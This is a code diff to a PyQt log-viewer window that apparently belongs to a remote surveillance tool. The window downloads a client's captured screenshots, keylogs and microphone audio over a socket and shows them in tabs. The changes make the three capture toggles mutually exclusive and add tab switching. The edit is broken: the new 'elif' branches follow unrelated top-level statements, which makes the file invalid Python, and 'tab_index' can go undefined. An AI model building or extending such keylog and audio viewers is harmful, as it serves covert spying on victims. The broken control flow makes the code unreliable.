@@ -47,6 +47,9 @@ class LogViewer(QWidget, logViewerUi):
         self.screenshotsTable.doubleClicked.connect(self.open_screenshot)
         self.keylogsTable.doubleClicked.connect(self.open_keylog)
         self.audioTable.doubleClicked.connect(self.open_audio)
+        self.screenshotsEnableButton.clicked.connect(self.screenshot_button_checked)
+        self.keylogsEnableButton.clicked.connect(self.keylogs_button_checked)
+        self.audioEnableButton.clicked.connect(self.audio_button_checked)
 
         # Init
         self.init_ui()
@@ -85,6 +88,21 @@ class LogViewer(QWidget, logViewerUi):
         self.downloadGroup.setWindowTitle(_('VIEWER_DOWNLOAD_GROUP_TITLE'))
         self.ignoreViewedCheck.setText(_('VIEWER_IGNOR_VIEWED'))
         self.downloadButton.setText(_('VIEWER_DOWNLOAD'))
+
+    def screenshot_button_checked(self):
+        if self.screenshotsEnableButton.isChecked():
+            self.keylogsEnableButton.setChecked(False)
+            self.audioEnableButton.setChecked(False)
+
+    def keylogs_button_checked(self):
+        if self.keylogsEnableButton.isChecked():
+            self.screenshotsEnableButton.setChecked(False)
+            self.audioEnableButton.setChecked(False)
+
+    def audio_button_checked(self):
+        if self.audioEnableButton.isChecked():
+            self.screenshotsEnableButton.setChecked(False)
+            self.keylogsEnableButton.setChecked(False)
 
     def update_date(self):
         self.date = str(self.timeCalendar.selectedDate().toPyDate())
@@ -126,10 +144,11 @@ class LogViewer(QWidget, logViewerUi):
 
         selected_date = self.date
 
-        selected_dir = str(QFileDialog.getExistingDirectory(self, _('VIEWER_SELECT_DIR')))
-        if len(selected_dir) == 0:
+        self.selected_dir = str(QFileDialog.getExistingDirectory(self, _('VIEWER_SELECT_DIR')))
+        if len(self.selected_dir) == 0:
             return
-        screenshots_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Screenshots')
+
+        screenshots_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Screenshots')
         if not os.path.exists(screenshots_dir):
             os.makedirs(screenshots_dir)
 
@@ -174,12 +193,15 @@ class LogViewer(QWidget, logViewerUi):
             self.downloadProgress.setHidden(True)
             self.downloadedLabel.setHidden(True)
 
-        keylogs_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Keylogs')
+            # Tab index
+            tab_index = 0
+
+        keylogs_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Keylogs')
         if not os.path.exists(keylogs_dir):
             os.makedirs(keylogs_dir)
 
         # Download Keylogs
-        if self.keylogsEnableButton.isChecked():
+        elif self.keylogsEnableButton.isChecked():
             count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadKeylogs', self.session_id)
             if count_data['mode'] == 'noDataFound':
                 return
@@ -216,13 +238,16 @@ class LogViewer(QWidget, logViewerUi):
             self.downloadProgress.setHidden(True)
             self.downloadedLabel.setHidden(True)
 
+            # Tab index
+            tab_index = 1
+
         # Download Audio
-        audio_dir = os.path.join(selected_dir, self.client_id, selected_date, 'Audio')
+        audio_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Audio')
         if not os.path.exists(audio_dir):
             os.makedirs(audio_dir)
 
         # Download Audio
-        if self.audioEnableButton.isChecked():
+        elif self.audioEnableButton.isChecked():
             count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadAudios', self.session_id)
             if count_data['mode'] == 'noDataFound':
                 return
@@ -259,12 +284,17 @@ class LogViewer(QWidget, logViewerUi):
             self.downloadProgress.setHidden(True)
             self.downloadedLabel.setHidden(True)
 
+            # Tab Index
+            tab_index = 2
+
         # All Finished
         self.check_data_counts()
         # Update Table
-        self.update_tables()
+        self.update_tables(tab_index)
 
-    def update_tables(self):
+    def update_tables(self, tab_index):
+
+        self.logsTab.setCurrentIndex(tab_index)
 
         if len(self.screenshots_dict) > 0:
             self.screenshotsTable.setRowCount(len(self.screenshots_dict))
@@ -334,7 +364,10 @@ class LogViewer(QWidget, logViewerUi):
                 self.audioTable.setItem(index, 0, item)
 
                 # add screenshot preview
-                generated_spectrum = spectrum_analyzer_image(self.audio_dict[key]['path'], self.audio_dict[key]['datetime'])
+                generated_spectrum = spectrum_analyzer_image(self.client_id,
+                                                             self.audio_dict[key]['path'],
+                                                             self.audio_dict[key]['datetime'],
+                                                             self.selected_dir)
                 image = QImage(generated_spectrum)
                 pixmap = QPixmap.fromImage(image)
                 spectrum_image = QLabel()
@@ -345,6 +378,7 @@ class LogViewer(QWidget, logViewerUi):
                 # add date time
                 item = QTableWidgetItem(self.audio_dict[key]['datetime'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                item.setTextColor(QColor('#f39c12'))
                 self.audioTable.setItem(index, 2, item)
 
                 # add path
